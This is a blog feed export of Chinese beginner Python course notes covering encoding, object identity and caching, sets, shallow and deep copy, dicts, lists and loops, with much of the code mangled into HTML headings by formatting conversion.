英文：<br>
str： 'hello '<br>
内存中的编码方式： Unicode<br>
表现形式： 'hello'<br>
bytes ：<br>
内存中的编码方式： 非Unicode<br>
表现形式：b'hello'<br>
中文：<br>
str：<br>
内存中的编码方式： Unicode<br>
表现形式：'中国'<br>
bytes ：<br>
内存中的编码方式： 非Unicode # Utf-8<br>
表现形式：b'\xe4\xb8\xad\xe5\x9b\xbd'</li>
</ol>
<h1 id="str-bytes">str ---&gt; bytes\</h1>
<h1 id="s1-中国">s1 = '中国'</h1>
<h1 id="b1-s1encodeutf-8-编码">b1 = s1.encode('utf-8') # 编码</h1>
<h1 id="printb1typeb1-bxe4xb8xadxe5x9bxbd">print(b1,type(b1)) # b'\xe4\xb8\xad\xe5\x9b\xbd'</h1>
<h1 id="b1-s1encodegbk-编码-bxd6xd0xb9xfa-class-bytes"># b1 = s1.encode('gbk') # 编码 # b'\xd6\xd0\xb9\xfa' &lt;class 'bytes'&gt;</h1>
<h1 id="bytes-str"># bytes----&gt;str</h1>
<h1 id="b1-bxe4xb8xadxe5x9bxbd">b1 = b'\xe4\xb8\xad\xe5\x9b\xbd'</h1>
<h1 id="s2-b1decodeutf-8-解码">s2 = b1.decode('utf-8') # 解码</h1>
<h1 id="prints2">print(s2)</h1>
<p>04 今日总结<br>
数据类型的补充： list（sort,revrse,列表的相加，乘，循环问题），dict （update 循环问题） ***<br>
编码的进阶：<br>
bytes为什么存在？<br>
str ---&gt;bytes(Unicode ---&gt; 非Unicode)<br>
gbk &lt;-----&gt; utf-8<br>
05 预习内容<br>
预习内容：<br>
文件操作，博客地址：http://www.cnblogs.com/jin-xin/articles/8183203.html</p>
<h1 id="gbk-utf-8">gbk ---&gt; utf-8</h1>
<p>b1 = b'\xd6\xd0\xb9\xfa'<br>
s = b1.decode('gbk')</p>
<h1 id="prints">print(s)</h1>
<p>b2 = s.encode('utf-8')<br>
print(b2) # b'\xe4\xb8\xad\xe5\x9b\xbd'</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day06(深浅copy 集合)]]></title>
        <id>https://itxz.fun/post/day06/</id>
        <link href="https://itxz.fun/post/day06/">
        </link>
        <updated>2020-04-23T03:58:03.000Z</updated>
        <content type="html"><![CDATA[<p>01 今日内容大纲</p>
<ol>
<li>is == id 用法</li>
<li>代码块</li>
<li>同一代码块下的缓存机制</li>
<li>不同代码块下的缓存机制（小数据池）</li>
<li>总结</li>
<li>集合（了解）</li>
<li>深浅copy<br>
02 昨日回顾以及作业讲解</li>
<li>字典初始：<br>
查询速度快，{'name': '太白'}, 存储大量的关联型数据。<br>
键：必须是不可变的数据类型（int，str，bool，tuple），唯一的。<br>
值：任意数据类型，对象。<br>
字典3.5x 之前无序的，3.6x 按照初始时的顺序排列，3.7之后有序的。</li>
<li>增删改查：<br>
增：setdefualt(), dic['age'] = 18<br>
删：pop 键(可以设置返回值)。clear 清空，del dic['name']<br>
改：dic['name'] = 'wusir'<br>
dic['name'] dic.get('name') dic.keys() dic.values() dic.items()</li>
<li>字典的嵌套。<br>
03 具体内容</li>
<li>id is ==</li>
</ol>
<h1 id="id-身份证号">id 身份证号</h1>
<h1 id="i-100">i = 100</h1>
<h1 id="s-alex">s = 'alex'</h1>
<h1 id="printidi">print(id(i))</h1>
<h1 id="printids">print(id(s))</h1>
<h1 id="比较的是两边的值是否相等">== 比较的是两边的值是否相等</h1>
<h1 id="l1-1-2-3">l1 = [1, 2, 3]</h1>
<h1 id="l2-1-2-3">l2 = [1, 2, 3]</h1>
<h1 id="printl1-l2">print(l1 == l2)</h1>
<h1 id="s1-alex">s1 = 'alex'</h1>
<h1 id="s2-alex">s2 = 'alex '</h1>
<h1 id="prints1-s2">print(s1 == s2)</h1>
<h1 id="is-判断的是内存地址是否相同">is 判断的是内存地址是否相同</h1>
<h1 id="l1-1-2-3-2">l1 = [1, 2, 3]</h1>
<ol start="2">
<li>代码块<br>
代码块：我们所有的代码都需要依赖代码块执行。<br>
一个文件就是一个代码块。<br>
交互式命令下一行就是一个代码块。</li>
<li>两个机制： 同一个代码块下，有一个机制。不同的代码块下，遵循另一个机制。</li>
<li>同一个代码块下的缓存机制。<br>
前提条件：同一个代码块内。</li>
</ol>
<h1 id="l2-1-2-3-2">l2 = [1, 2, 3]</h1>
<h1 id="printidl1">print(id(l1))</h1>
<h1 id="printidl2">print(id(l2))</h1>
<h1 id="printl1-is-l2">print(l1 is l2)</h1>
<p>s1 = 'alex'<br>
s2 = 'alex'<br>
print(id(s1))<br>
print(id(s2))<br>
print(s1 is s2)</p>
<h1 id="id-相同值一定相同">id 相同，值一定相同</h1>
<h1 id="值相同id不一定相同">值相同，id不一定相同</h1>
<p>机制内容：pass<br>
适用的对象： int bool str<br>
具体细则：所有的数字，bool，几乎所有的字符串。<br>
优点：提升性能，节省内存。<br>
5. 不同代码块下的缓存机制： 小数据池。<br>
前提条件：不同代码块内。<br>
机制内容：pass<br>
适用的对象： int bool str<br>
具体细则：-5~256数字，bool，满足规则的字符串。<br>
优点：提升性能，节省内存。</p>
<h1 id="i1-1000">i1 = 1000</h1>
<h1 id="i2-1000">i2 = 1000</h1>
<h1 id="i3-1000">i3 = 1000</h1>
<h1 id="l1-123">l1 = [1,2,3]</h1>
<h1 id="l2-123">l2 = [1,2,3]</h1>
<h1 id="printidl1-2">print(id(l1))</h1>
<h1 id="printidl2-2">print(id(l2))</h1>
<h1 id="printidi1">print(id(i1))</h1>
<h1 id="printidi2">print(id(i2))</h1>
<h1 id="printidi3">print(id(i3))</h1>
<p>i = 800<br>
i1 = 800<br>
s1 = 'hfdjka6757fdslslgaj@!#fkdjlsafjdskl;fjds中国'<br>
s2 = 'hfdjka6757fdslslgaj@!#fkdjlsafjdskl;fjds中国'<br>
print(i is i1)<br>
print(s1 is s2)</p>
<ol>
<li>总结：+</li>
<li>面试题考。</li>
<li>回答的时候一定要分清楚：同一个代码块下适用一个缓存机制。不同的代码块下适用另一个缓存机制（小<br>
数据池）</li>
<li>小数据池：数字的范围是-5~256.</li>
<li>缓存机制的优点：提升性能，节省内存。</li>
<li>python基础数据类型之：集合 set。容器型的数据类型，它要求它里面的元素是不可变的数据，但是它本身是<br>
可变的数据类型。集合是无序的。{}。<br>
集合的作用：<br>
列表的去重。<br>
关系测试： 交集，并集，差集，.....<br>
pass</li>
</ol>
<h1 id="集合的创建">集合的创建：</h1>
<h1 id="set1-set1-3-barry-false">set1 = set({1, 3, 'Barry', False})</h1>
<h1 id="set1-1-3-太白金星-4-alex-false-武大">set1 = {1, 3, '太白金星', 4, 'alex', False, '武大'}</h1>
<h1 id="printset1">print(set1)</h1>
<h1 id="空集合">空集合：</h1>
<h1 id="print-type-空字典">print({}, type({})) # 空字典</h1>
<h1 id="set1-set">set1 = set()</h1>
<h1 id="printset1-2">print(set1)</h1>
<h1 id="集合的有效性测试">集合的有效性测试</h1>
<h1 id="set1-123-3-name-alex">set1 = {[1,2,3], 3, {'name': 'alex'}}</h1>
<h1 id="printset1-3">print(set1)</h1>
<h1 id="set1-太白金星-景女神-武大-三粗-alexsb-吴老师">set1 = {'太白金星', '景女神', '武大', '三粗', 'alexsb', '吴老师'}</h1>
<h1 id="增">增：</h1>
<h1 id="add">add</h1>
<h1 id="set1addxx">set1.add('xx')</h1>
<h1 id="printset1-4">print(set1)</h1>
<h1 id="update迭代着增加">update迭代着增加</h1>
<h1 id="set1updatefdsafgsd">set1.update('fdsafgsd')</h1>
<h1 id="printset1-5">print(set1)</h1>
<h1 id="删">删</h1>
<h1 id="remove">remove</h1>
<h1 id="remove-按照元素删除">remove 按照元素删除</h1>
<h1 id="set1removealexsb">set1.remove('alexsb')</h1>
<h1 id=""></h1>
<h1 id="printset1-6">print(set1)</h1>
<h1 id="pop-随即删除">pop 随即删除</h1>
<h1 id="set1pop">set1.pop()</h1>
<h1 id="printset1-7">print(set1)</h1>
<h1 id="变相改值">变相改值</h1>
<h1 id="set1remove太白金星">set1.remove('太白金星')</h1>
<h1 id="set1add男神">set1.add('男神')</h1>
<h1 id="printset1-8">print(set1)</h1>
<p>#关系测试：***</p>
<h1 id="交集">交集</h1>
<h1 id="set1-1-2-3-4-5">set1 = {1, 2, 3, 4, 5}</h1>
<h1 id="set2-4-5-6-7-8">set2 = {4, 5, 6, 7, 8}</h1>
<h1 id="printset1-set2">print(set1 &amp; set2)</h1>
<h1 id="并集">并集：</h1>
<h1 id="printset1-set2-2">print(set1 | set2)</h1>
<h1 id="差集-">差集 -</h1>
<h1 id="printset1-set2-3">print(set1 - set2)</h1>
<h1 id="反交集">反交集</h1>
<h1 id="printset1-set2-4">print(set1 ^ set2)</h1>
<h1 id="子集">子集</h1>
<h1 id="set1-123">set1 = {1,2,3}</h1>
<h1 id="set2-123456">set2 = {1,2,3,4,5,6}</h1>
<h1 id="printset1-set2-5"># print(set1 &lt; set2)</h1>
<h1 id="-2"></h1>
<h1 id="超集"># 超集</h1>
<h1 id="printset2-set1">print(set2 &gt; set1)</h1>
<h1 id="列表的去重">列表的去重 ***</h1>
<h1 id="l1-1太白-1-2-2-太白2-6-6-6-3-太白-4-5">l1 = [1,'太白', 1, 2, 2, '太白',2, 6, 6, 6, 3, '太白', 4, 5, ]</h1>
<h1 id="set1-setl1">set1 = set(l1)</h1>
<h1 id="l1-listset1">l1 = list(set1)</h1>
<ol start="3">
<li>深浅copy（面试会考）</li>
</ol>
<h1 id="printl1">print(l1)</h1>
<h1 id="用处数据之间的关系列表去重">用处：数据之间的关系，列表去重。</h1>
<h1 id="赋值运算">赋值运算</h1>
<h1 id="l1-1-2-3-22-33">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1">l2 = l1</h1>
<h1 id="l1append666">l1.append(666)</h1>
<h1 id="printl1-2">print(l1)</h1>
<h1 id="printl2">print(l2)</h1>
<h1 id="浅copy">浅copy</h1>
<h1 id="l1-1-2-3-22-33-2">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1copy">l2 = l1.copy()</h1>
<h1 id="l1append666-2">l1.append(666)</h1>
<h1 id="printl1idl1">print(l1,id(l1))</h1>
<h1 id="printl2idl2">print(l2,id(l2))</h1>
<h1 id="l1-1-2-3-22-33-3">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1copy-2">l2 = l1.copy()</h1>
<h1 id="l1-1append666">l1[-1].append(666)</h1>
<h1 id="printidl1-1">print(id(l1[-1]))</h1>
<h1 id="printidl2-1">print(id(l2[-1]))</h1>
<h1 id="printidl10">print(id(l1[0]))</h1>
<h1 id="printidl20">print(id(l2[0]))</h1>
<h1 id="printl1-3">print(l1)</h1>
<h1 id="printl2-2">print(l2)</h1>
<h1 id="l1-1-2-3-22-33-4">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1copy-3">l2 = l1.copy()</h1>
<h1 id="l10-90">l1[0] = 90</h1>
<h1 id="printl1-4">print(l1)</h1>
<h1 id="printl2-3">print(l2)</h1>
<h1 id="深copy">深copy</h1>
<h1 id="import-copy">import copy</h1>
<h1 id="l1-1-2-3-22-33-5">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-copydeepcopyl1">l2 = copy.deepcopy(l1)</h1>
<h1 id="printidl1-3"># print(id(l1))</h1>
<h1 id="printidl2-3"># print(id(l2))</h1>
<h1 id="l1-1append666-2">l1[-1].append(666)</h1>
<h1 id="printl1-5">print(l1)</h1>
<h1 id="printl2-4">print(l2)</h1>
<h1 id="相关面试题">相关面试题；</h1>
<h1 id="l1-1-2-3-22-33-6">l1 = [1, 2, 3, [22, 33]]</h1>
<h1 id="l2-l1-2">l2 = l1[:]</h1>
<h1 id="l1-1append666-3">l1[-1].append(666)</h1>
<h1 id="printl1-6">print(l1)</h1>
<h1 id="printl2-5">print(l2)</h1>
<h1 id="浅copy-list-dict-嵌套的可变的数据类型是同一个">浅copy： list dict: 嵌套的可变的数据类型是同一个。</h1>
<h1 id="深copy-list-dict-嵌套的可变的数据类型不是同一个">深copy： list dict: 嵌套的可变的数据类型不是同一个 。</h1>
<p>04 今日总结<br>
id is == 三个方法要会用，知道是做什么的。<br>
回答的时候一定要分清楚：同一个代码块下适用一个缓存机制。不同的代码块下适用另一个缓存机制（小数据<br>
池）<br>
小数据池：数字的范围是-5~256.<br>
缓存机制的优点：提升性能，节省内存。<br>
集合：列表去重，关系测试。<br>
深浅copy：理解浅copy，深浅copy,课上练习题整明白。<br>
05 预习内容<br>
数据类型的补充以及编码的进阶：https://www.cnblogs.com/jin-xin/articles/10577131.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day05]]></title>
        <id>https://itxz.fun/post/day05/</id>
        <link href="https://itxz.fun/post/day05/">
        </link>
        <updated>2020-04-22T09:40:07.000Z</updated>
        <content type="html"><![CDATA[<p>今日内容大纲<br>
字典的初识<br>
字典的使用（增删改查）<br>
字典的嵌套<br>
02 内容回顾以及作业讲解<br>
列表：容器型数据类型，可以承载大量的数据，有序的数据。<br>
增：<br>
append 追加<br>
insert 插入<br>
extend 迭代着追加<br>
删：<br>
pop 按照索引删除。有返回值，默认删除最后一个<br>
remove 按照元素删除<br>
clear 清空<br>
del 索引，切片（步长）<br>
改：<br>
l1[1] = '大壮'<br>
l1[1:3] = 'fdsafdsafdhsjkf'<br>
l1[1:4:2] = '太白'<br>
查：索引，切片，for循环<br>
元组：只读列表，(), 拆包<br>
range：看做：可以自己控制范围的数字列表，但是它不是列表。<br>
03 具体内容<br>
字典的初识：</p>
<p>why：</p>
<p>列表可以存储大量的数据，数据之间的关联性不强<br>
['太白', 18, '男', '大壮', 3, '男']<br>
列表的查询速度比较慢。<br>
what：容器型数据类型：dict。</p>
<p>how：</p>
<p>数据类型的分类（可变与不可变）：</p>
<p>可变（不可哈希）的数据类型：list dict set<br>
不可变（可哈希）的数据类型： str bool int tuple<br>
字典：{}括起来，以键值对形式存储的容器型数据类型：</p>
<p>dic = {'太白':<br>
{'name': '太白金星','age': 18, 'sex': '男'},<br>
'python22期':<br>
['朱光亚', '大壮', '雪飞', '岑哥'],<br>
}<br>
键必须是不可变的数据类型：int , str (bool tuple几乎不用) 唯一的。</p>
<p>值可以是任意数据类型，对象。</p>
<p>字典3.5x版本之前（包括3.5）是无序的。</p>
<p>字典3.6x会按照初次建立字典的顺序排列，学术上不认为是有序的。</p>
<p>字典3.7x以后都是有序的。</p>
<p>字典的优点：查询速度非常快，存储关联性的数据。</p>
<p>字典的缺点：以空间换时间。</p>
<p>字典的创建方式：</p>
<h1 id="面试会考">面试会考</h1>
<h1 id="方式一">方式一：</h1>
<h1 id="dic-dictone-1-two-2-three-3">dic = dict((('one', 1), ('two', 2), ('three', 3)))</h1>
<h1 id="printdic-one-1-two-2-three-3">print(dic)  # {'one': 1, 'two': 2, 'three': 3}</h1>
<h1 id="方式二">方式二：</h1>
<h1 id="dic-dictone1-two2-three3">dic = dict(one=1, two=2, three=3)</h1>
<h1 id="printdic">print(dic)</h1>
<h1 id="方式三">方式三：</h1>
<h1 id="dic-dictone-1-two-2-three-3-2">dic = dict({'one': 1, 'two': 2, 'three': 3})</h1>
<h1 id="printdic-2">print(dic)</h1>
<p>验证字典的合法性：</p>
<p>dic = {[1,2,3]: 'alex', 1: 666}  # 键要不可变的数据类型<br>
print(dic)<br>
dic = {1: 'alex', 1: '太白', 2: 'wusir'}  # 键要唯一<br>
print(dic)<br>
字典的增删改查</p>
<p>dic = {'name': '太白', 'age': 18, 'hobby_list': ['直男', '钢管', '开车']}</p>
<h1 id="增">增：</h1>
<h1 id="直接增加-有则改之无则增加">直接增加 有则改之，无则增加</h1>
<h1 id="dicsex-男">dic['sex'] = '男'</h1>
<h1 id="dicage-23-改">dic['age'] = 23  # 改</h1>
<h1 id="printdic-3">print(dic)</h1>
<h1 id="setdefault-有则不变无则增加">setdefault  有则不变，无则增加</h1>
<h1 id="dicsetdefaulthobby">dic.setdefault('hobby')</h1>
<h1 id="dicsetdefaulthobby-球类运动">dic.setdefault('hobby', '球类运动')</h1>
<h1 id="dicsetdefaultage-45">dic.setdefault('age', 45)</h1>
<h1 id="printdic-4">print(dic)</h1>
<h1 id="删">删</h1>
<h1 id="pop-按照键删除键值对-有返回值">pop 按照键删除键值对, 有返回值  ***</h1>
<h1 id="设置第二个参数则无论字典中有无此键都不会报错">设置第二个参数则无论字典中有无此键都不会报错</h1>
<h1 id="dicpopage">dic.pop('age')</h1>
<h1 id="ret-dicpopage">ret = dic.pop('age')</h1>
<h1 id="ret-dicpophobby没有此键">ret = dic.pop('hobby','没有此键')</h1>
<h1 id="printret">print(ret)</h1>
<h1 id="printdic-5">print(dic)</h1>
<h1 id="clear-清空">clear  清空  **</h1>
<h1 id="dicclear">dic.clear()</h1>
<h1 id="printdic-6">print(dic)</h1>
<h1 id="del">del  **</h1>
<h1 id="del-dicage"># del dic['age']</h1>
<h1 id="del-dicage1">del dic['age1']</h1>
<h1 id="printdic-7">print(dic)</h1>
<h1 id="改">改</h1>
<h1 id="dicname-alex">dic['name'] = 'alex'</h1>
<h1 id="printdic-8">print(dic)</h1>
<h1 id="查">查</h1>
<h1 id="printdichobby_list">print(dic['hobby_list'])</h1>
<h1 id="printdichobby_list1">print(dic['hobby_list1'])</h1>
<h1 id="get">get  ***</h1>
<h1 id="l1-dicgethobby_list">l1 = dic.get('hobby_list')</h1>
<h1 id="l1-dicgethobby_list1没有此键sb-可以设置返回值">l1 = dic.get('hobby_list1','没有此键sb')  # 可以设置返回值</h1>
<h1 id="printl1">print(l1)</h1>
<h1 id="三个特殊的">三个特殊的</h1>
<h1 id="keys-values-items">keys() values() items()</h1>
<h1 id="printdickeystypedickeys">print(dic.keys(),type(dic.keys()))</h1>
<h1 id="可以转化成列表">可以转化成列表</h1>
<h1 id="printlistdickeys">print(list(dic.keys()))</h1>
<h1 id="for-key-in-dickeys">for key in dic.keys():</h1>
<h1 id="printkey">print(key)</h1>
<h1 id="for-key-in-dic">for key in dic:</h1>
<h1 id="printkey-2">print(key)</h1>
<h1 id="values">values()</h1>
<h1 id="printdicvalues">print(dic.values())</h1>
<h1 id="printlistdicvalues">print(list(dic.values()))</h1>
<h1 id="for-value-in-dicvalues">for value in dic.values():</h1>
<h1 id="printvalue">print(value)</h1>
<h1 id="items">items()</h1>
<h1 id="printdicitems">print(dic.items())</h1>
<h1 id="for-keyvalue-in-dicitems">for key,value in dic.items():</h1>
<h1 id="printkeyvalue">print(key,value)</h1>
<h1 id="ab-name-太白">a,b = ('name', '太白')</h1>
<h1 id="printab">print(a,b)</h1>
<h1 id="面试题">面试题</h1>
<h1 id="a-18">a = 18</h1>
<h1 id="b-12">b = 12</h1>
<h1 id="ab-ba">a,b = b,a</h1>
<h1 id="ab-1218"># a,b = 12,18</h1>
<h1 id="printab-2">print(a,b)</h1>
<p>相关练习题：</p>
<p>dic = {'k1': &quot;v1&quot;, &quot;k2&quot;: &quot;v2&quot;, &quot;k3&quot;: [11,22,33]}</p>
<h1 id="请在字典中添加一个键值对k4-v4输出添加后的字典">请在字典中添加一个键值对，&quot;k4&quot;: &quot;v4&quot;，输出添加后的字典</h1>
<h1 id="请在修改字典中-k1-对应的值为-alex输出修改后的字典">请在修改字典中 &quot;k1&quot; 对应的值为 &quot;alex&quot;，输出修改后的字典</h1>
<h1 id="请在k3对应的值中追加一个元素-44输出修改后的字典">请在k3对应的值中追加一个元素 44，输出修改后的字典</h1>
<h1 id="printdick3">print(dic['k3'])</h1>
<h1 id="l1-dicgetk3">l1 = dic.get('k3')</h1>
<h1 id="printl1-2">print(l1)</h1>
<h1 id="dicgetk3append44">dic.get('k3').append(44)</h1>
<h1 id="printdic-9">print(dic)</h1>
<h1 id="请在k3对应的值的第-1-个位置插入个元素-18输出修改后的字典">请在k3对应的值的第 1 个位置插入个元素 18，输出修改后的字典</h1>
<p>字典的嵌套</p>
<p>dic = {<br>
'name': '汪峰',<br>
'age': 48,<br>
'wife': [{'name': '国际章', 'age': 38},],<br>
'children': {'girl_first': '小苹果','girl_second': '小怡','girl_three': '顶顶'}<br>
}</p>
<h1 id="1-获取汪峰的名字">1. 获取汪峰的名字。</h1>
<h1 id=""></h1>
<h1 id="2获取这个字典name国际章age38">2.获取这个字典：{'name':'国际章','age':38}。</h1>
<h1 id="-2"></h1>
<h1 id="3-获取汪峰妻子的名字">3. 获取汪峰妻子的名字。</h1>
<h1 id="4-获取汪峰的第三个孩子名字">4. 获取汪峰的第三个孩子名字。</h1>
<p>04 今日总结<br>
字典：查询速度快，数据的关联性强。<br>
键不可变得数据类型，（str int），唯一。<br>
值：任意数据类型，对象。<br>
增删改查（全部都要会默写）***<br>
字典的嵌套。***<br>
05 明日预习内容<br>
明天讲理论性偏多：id is == 小数据池，集合。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day04]]></title>
        <id>https://itxz.fun/post/day04/</id>
        <link href="https://itxz.fun/post/day04/">
        </link>
        <updated>2020-04-22T09:36:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="1-今日内容大纲">1 今日内容大纲</h2>
<ul>
<li>列表的初识</li>
<li>列表的索引切片</li>
<li>列表的增删改查</li>
<li>列表的嵌套</li>
<li>元组的初识（了解）</li>
<li>元组的简单应用（了解）</li>
<li>range</li>
</ul>
<h2 id="2-昨日内容回顾以及作业讲解">2 昨日内容回顾以及作业讲解</h2>
<ul>
<li>int str bool</li>
<li>str：s1 = '太白123abc'
<ul>
<li>索引：
<ul>
<li>s1[0]</li>
<li>s1[-1]</li>
<li>s1[:3]</li>
<li>s1[:5:2]</li>
<li>s1[-1:-4:-1]</li>
<li>s1[-1:-6:-2]</li>
</ul>
</li>
<li>常用操作方法：
<ul>
<li>upper lower</li>
<li>startswith endswith</li>
<li>split 分割：str----&gt;list
<ul>
<li>默认按照空格。</li>
<li>可以指定分隔符。</li>
</ul>
</li>
<li>strip：默认去除字符串两边的空格，换行符，制表符。</li>
<li>isdecimal isalpha  isalnum</li>
<li>format 格式化输出</li>
<li>count某个元素出现的次数</li>
<li>join 连接</li>
<li>replace</li>
<li>len() 获取数据的元素个数。</li>
</ul>
</li>
<li>for循环</li>
</ul>
</li>
</ul>
<h2 id="3-具体内容">3 具体内容</h2>
<ol>
<li>
<p><strong>如何学习python</strong></p>
<p>确实非常困难。如何解压？如何学习。</p>
<p>python，语言，中文，英语。</p>
<p>华尔街英语：母式英语。</p>
<p>中国人教的英语：在国外很难生存。</p>
<p>听说读写练。</p>
<p>​	input 							output</p>
<p>​	听									写（练）</p>
<p>​	读                                    说</p>
<p>2岁的孩子：</p>
</li>
</ol>
<p>​			听，							     说    											纠正</p>
<p>​</p>
<p>​		你们现在的比例：<br>
​				听：3.5 + 2 +  1 = 6.5        练：2~3.								纠正：0.5</p>
<p>​		120行 *120:14400</p>
<p>​		1.  上午要认真听！！！</p>
<p>​		2. 下午不要听视频，抓紧时间放在练习代码上，写作业，代码251行。</p>
<p>​		3. 讨论（下周开始）。</p>
<ol start="2">
<li>
<p><strong>列表的初识</strong></p>
<ul>
<li>
<p>why：int bool str：'123 True 太白'</p>
<ul>
<li>str： 存储少量的数据。</li>
<li>str：切片还是对其进行任何操作，获取的内容全都是str类型。存储的数据单一。</li>
</ul>
</li>
<li>
<p>what：list</p>
<ul>
<li>l1 = [100, 'alex',True,[1, 2, 3]] 承载任意数据类型，存储大量的数据。</li>
<li>python常用的容器型数据类型。list 列表，其他语言：Java: 数组。</li>
<li>列表是有序的，可索引，切片（步长）。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>索引，切片，步长。</strong></p>
<pre><code class="language-python">li = [100, '太白', True, [1, 2, 3]]
# 索引
# print(li[0], type(li[0]))
# print(li[1],type(li[1]))
# print(li[-1])

# 切片 （顾头不顾腚）
# print(li[:2])
</code></pre>
<p>相关练习题：</p>
<pre><code class="language-python">li = [1, 3, 2, &quot;a&quot;, 4, &quot;b&quot;, 5,&quot;c&quot;]
通过对li列表的切片形成新的列表l1,l1 = [1,3,2]
通过对li列表的切片形成新的列表l2,l2 = [&quot;a&quot;,4,&quot;b&quot;]
通过对li列表的切片形成新的列表l4,l4 = [3,&quot;a&quot;,&quot;b&quot;]
通过对li列表的切片形成新的列表l6,l6 = [&quot;b&quot;,&quot;a&quot;,3]
</code></pre>
</li>
<li>
<p>列表的增删改查</p>
<pre><code class="language-python"># 列表的创建
# 方式一
# l1 = [1, 2, 'Alex']

# 方式二
# l1 = list()
# l1 = list('fhdsjkafsdafhsdfhsdaf')
# print(l1)

# 方式三：列表推导式 后面讲

# 增删改查
l1 = ['太白', '女神', 'xiao','吴老师', '闫龙']
# 增：
# append:追加
# l1.append('xx')
# print(l1.append('xx'))  # 不能打印它
# print(l1)

# 举例：
# l1 = ['太白', '女神', '吴老师', 'xiao', '闫龙']
# while 1:
#     name = input('请输入新员工姓名：(Q或者q退出程序)')
#     if name.upper() == 'Q': break
#     l1.append(name)
# print(l1)

# insert 插入
# l1.insert(2,'wusir')
# print(l1)
#extend 迭代着追加
# l1.extend('abcd')
# l1.extend(['alex',])
# l1.extend(['alex', 1, 3])
# print(l1)

# 删
# pop 按照索引位置删除
# l1.pop(-2)  # 按照索引删除 （返回的是删除的元素）
# print(l1.pop(-2))
# l1.pop()  # 默认删除最后一个
# print(l1)

# remove  指定元素删除,如果有重名元素，默认删除从左数第一个
# l1.remove('xiao')
# print(l1)

# clear(了解)
# l1.clear() # 清空
# print(l1)

# del
    # 按照索引删除
# del l1[-1]
# print(l1)
    # 按照切片(步长)删除
# del l1[::2]
# print(l1)

# 改
# 按照索引改值
# l1[0] = '男神'
# 按照切片改（了解）
# l1[2:] = 'fsdafsdafsdfdsfsadfdsfdsgsfdag'
# print(l1)
# 按照切片（步长）（了解）
# l1[::2] = 'abc'
# l1[::2] = 'abcd'
# print(l1)

# 查：
# 索引，切片（步长）
# for i in l1:
#     print(i)
</code></pre>
</li>
<li>
<p>列表的嵌套</p>
<pre><code class="language-python">l1 = [1, 2, 'taibai', [1, 'alex', 3,]]
# 1, 将l1中的'taibai'变成大写并放回原处。
# 2，给小列表[1,'alex',3,]追加一个元素,'老男孩教育'。
# 3，将列表中的'alex'通过字符串拼接的方式在列表中变成'alexsb'
</code></pre>
</li>
<li>
<p>元组(<strong>了解</strong>)</p>
<ul>
<li>只读列表。存大量的数据，可以索引，切片（步长），  (100, '太白', True, [1, 2, 3])</li>
</ul>
</li>
<li>
<p>range： 类似于列表，自定制数字范围的数字列表</p>
</li>
</ol>
<h2 id="4-今日总结">4 今日总结</h2>
<ol>
<li>
<p>列表的所有的方法全部都要记住，背过（除去了解的）append insert extend pop remove del clear  。</p>
</li>
<li>
<p>列表的嵌套一定要会。</p>
</li>
<li>
<p>range.与for循环结合。</p>
</li>
</ol>
<h2 id="5-节后预习内容">5 节后预习内容</h2>
<p>​	1. 字典。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day03（for循环）]]></title>
        <id>https://itxz.fun/post/day03for-xun-huan/</id>
        <link href="https://itxz.fun/post/day03for-xun-huan/">
        </link>
        <updated>2020-04-22T09:25:56.000Z</updated>
        <content type="html"><![CDATA[<h1 id="s1-老男孩edu">s1 = '老男孩edu'</h1>
<h1 id="print老-in-s1">print('老' in s1)</h1>
<h1 id="print老男-in-s1">print('老男' in s1)</h1>
<h1 id="print老ed-in-s1">print('老ed' in s1)</h1>
<h1 id="print老ed-not-in-s1">print('老ed' not in s1)</h1>
<p>s1 = '老男孩教育最好的讲师：太白'<br>
'''<br>
老      s1[0]<br>
男      s1[1]<br>
孩      s1[2]<br>
教      s1[3]<br>
育      ....<br>
最<br>
...<br>
'''</p>
<h1 id="0~12">0~12</h1>
<h1 id="len-获取可迭代对象的元素总个数">len :获取可迭代对象的元素总个数</h1>
<h1 id="printlens1">print(len(s1))</h1>
<h1 id="s1-老男孩教育最好的讲师太白">s1 = '老男孩教育最好的讲师：太白'</h1>
<h1 id="index-0">index = 0</h1>
<h1 id="while-index-lens1">while index &lt; len(s1):</h1>
<h1 id="prints1index">print(s1[index])</h1>
<h1 id="index-1">index += 1</h1>
<h1 id="for-循环">for 循环</h1>
<p>'''<br>
有限循环<br>
for 变量 in iterable:<br>
pass<br>
'''<br>
s1 = '老男孩教育最好的讲师：太白'</p>
<h1 id="for-i-in-s1">for i in s1:</h1>
<h1 id="printi">print(i)</h1>
<p>for i in s1:<br>
print(i)<br>
if i == '好':<br>
break</p>
<h1 id="break-continue">break continue</h1>
<h1 id="for-else-while-else用法一样">for else: while else:用法一样。</h1>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day03(str&&切片)]]></title>
        <id>https://itxz.fun/post/day03strandqie-pian/</id>
        <link href="https://itxz.fun/post/day03strandqie-pian/">
        </link>
        <updated>2020-04-22T09:24:16.000Z</updated>
        <content type="html"><![CDATA[<h1 id="s1-python全栈22期">s1 = 'python全栈22期'</h1>
<h1 id="对字符串进行索引切片出来的数据都是字符串类型"># 对字符串进行索引，切片出来的数据都是字符串类型。</h1>
<h1 id="按照索引取值"># 按照索引取值</h1>
<h1 id="从左至右有顺序下标索引"># 从左至右有顺序，下标，索引。</h1>
<h1 id="s2-s10">s2 = s1[0]</h1>
<h1 id="prints2types2">print(s2,type(s2))</h1>
<h1 id="s3-s12">s3 = s1[2]</h1>
<h1 id="prints3">print(s3)</h1>
<h1 id="s4-s1-1">s4 = s1[-1]</h1>
<h1 id="prints4">print(s4)</h1>
<h1 id=""></h1>
<h1 id="按照切片取值"># 按照切片取值。</h1>
<h1 id="顾头不顾腚"># 顾头不顾腚</h1>
<h1 id="s5-s106">s5 = s1[0:6]</h1>
<h1 id="s5-s16">s5 = s1[:6]</h1>
<h1 id="prints5">print(s5)</h1>
